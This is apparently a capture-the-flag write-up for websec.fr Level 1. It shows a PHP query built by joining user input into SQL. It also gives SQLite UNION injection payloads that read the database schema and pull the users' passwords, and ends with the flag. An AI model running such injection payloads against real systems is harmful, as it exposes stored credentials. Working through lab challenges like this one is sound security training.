Level 1
===
1. First, lets check what is written in http://websec.fr/level01/source.php
2. Then we can find that there is no keywords that would be filter, so we could skip most of them and find : 
```
"$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';"
```
3. If we filled in the blank on the website, we would find out : 
```
"$query = ‘SELECT id,username FROM users WHERE id=’ . 1 . ’ LIMIT 1’;"
```
4. We first check out what kinds of tables is there in the database using the command :
```
1 UNION SELECT 1, sql FROM sqlite_master WHERE tbl_name='users'--
```
5. Okay! Then we are able to use the strong command "UNION" to get what we need ~~~
```
1 union select 1,password from users where id=1
```
6. There is the flag : WEBSEC{Simple_SQLite_Injection}
